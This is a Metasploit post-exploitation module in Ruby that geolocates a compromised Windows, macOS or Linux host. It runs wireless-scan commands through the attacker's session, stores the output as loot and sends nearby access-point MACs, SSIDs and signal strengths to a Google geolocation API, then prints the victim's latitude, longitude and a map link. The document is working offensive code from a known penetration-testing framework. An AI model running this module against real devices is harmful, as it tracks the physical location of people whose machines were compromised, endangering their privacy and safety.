##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'json'
require 'net/http'

class Metasploit3 < Msf::Post

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Multiplatform Wireless LAN Geolocation',
        'Description'   => %q{ Geolocate the target device by gathering local
        wireless networks and performing a lookup against Google APIs.},
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Tom Sellers <tom <at> fadedcode.net>'],
        'Platform'      => %w{ osx win linux },
        'SessionTypes'  => [ 'meterpreter', 'shell' ],
      ))

  end

  def get_strength(quality)
    # Convert the signal quality to signal strength (dbm) to be sent to
    # Google.  Docs indicate this should subtract 100 instead of the 95 I
    # am using here, but in practice 95 seems to be closer.
    signal_str = quality.to_i / 2
    signal_str = (signal_str - 95).round
    return signal_str

  end

  def parse_wireless_win(listing)
    wlan_list = ''
    raw_networks = listing.split("\r\n\r\n")

    raw_networks.each { |network|
      details = network.match(/^SSID [\d]+ : ([^\r\n]*).*?BSSID 1[\s]+: ([\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}).*?Signal[\s]+: ([\d]{1,3})%/m)
        if !details.nil?
          strength = get_strength(details[3])
          network_data = "&wifi=mac:#{details[2].to_s.upcase}|ssid:#{details[1].to_s}|ss=#{strength.to_i}"
          wlan_list << network_data
        end
    }

    return wlan_list
  end


  def parse_wireless_linux(listing)
    wlan_list = ''
    raw_networks = listing.split("Cell ")

    raw_networks.each { |network|
      details = network.match(/^[\d]{1,4} - Address: ([\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}).*?Signal level=([\d-]{1,3}).*?ESSID:"([^"]*)/m)
        if !details.nil?
          network_data = "&wifi=mac:#{details[1].to_s.upcase}|ssid:#{details[3].to_s}|ss=#{details[2].to_i}"
          wlan_list << network_data
        end
    }

    return wlan_list
  end

  def parse_wireless_osx(listing)
    wlan_list = ''
    raw_networks = listing.split("\n")

    raw_networks.each { |network|
      network = network.strip
      details = network.match(/^(.*(?!\h\h:))[\s]*([\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}:[\h]{2})[\s]*([\d-]{1,3})/)
        if !details.nil?
          network_data = "&wifi=mac:#{details[2].to_s.upcase}|ssid:#{details[1].to_s}|ss=#{details[3].to_i}"
          wlan_list << network_data
        end
    }

    return wlan_list
  end


  # Run Method for when run command is issued
  def run
    if session.type =~ /shell/
      # Use the shell platform for selecting the command
      platform = session.platform
    else
      # For Meterpreter use the sysinfo OS since java Meterpreter returns java as platform
      platform = session.sys.config.sysinfo['OS']
    end


    case platform
    when /win/i

      listing = cmd_exec('netsh wlan show networks mode=bssid')
      if listing.nil?
        print_error("Unable to generate wireless listing..")
        return nil
      else
        store_loot("host.windows.wlan.networks", "text/plain", session, listing, "wlan_networks.txt", "Available Wireless LAN Networks")
        wlan_list = parse_wireless_win(listing)
      end

    when /osx/i

      listing = cmd_exec('/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s')
      if listing.nil?
        print_error("Unable to generate wireless listing..")
        return nil
      else
        store_loot("host.osx.wlan.networks", "text/plain", session, listing, "wlan_networks.txt", "Available Wireless LAN Networks")
        wlan_list = parse_wireless_osx(listing)
      end

    when /linux/i

      listing = cmd_exec('iwlist scanning')
      if listing.nil?
        print_error("Unable to generate wireless listing..")
        return nil
      else
        store_loot("host.linux.wlan.networks", "text/plain", session, listing, "wlan_networks.txt", "Available Wireless LAN Networks")
        wlan_list = parse_wireless_linux(listing)
      end
    else
      print_error("The target's platform is not supported at this time.")
      return nil
    end

    if wlan_list.nil? || wlan_list.empty?
      print_error("Unable to enumerate wireless networks from the target.  Wireless may not be present or enabled.")
      return
    end


    # Build and send the request to Google
    url = "https://maps.googleapis.com/maps/api/browserlocation/json?browser=firefox&sensor=true#{wlan_list}"
    uri = URI.parse(URI.encode(url))
    request = Net::HTTP::Get.new(uri.request_uri)
    http = Net::HTTP::new(uri.host,uri.port)
    http.use_ssl = true
    response = http.request(request)

    # Gather the required information from the response
    if response && response.code == '200'
      results = JSON.parse(response.body)
      latitude =  results["location"]["lat"]
      longitude = results["location"]["lng"]
      accuracy = results["accuracy"]
      print_status("Google indicates that the target is within #{accuracy} meters of #{latitude},#{longitude}.")
      print_status("Google Maps URL:  https://maps.google.com/?q=#{latitude},#{longitude}")
    else
      print_error("Failure connecting to Google for location lookup")
    end


    rescue Rex::TimeoutError, Rex::Post::Meterpreter::RequestError
    rescue ::Exception => e
      print_status("The following Error was encountered: #{e.class} #{e}")
    end


end
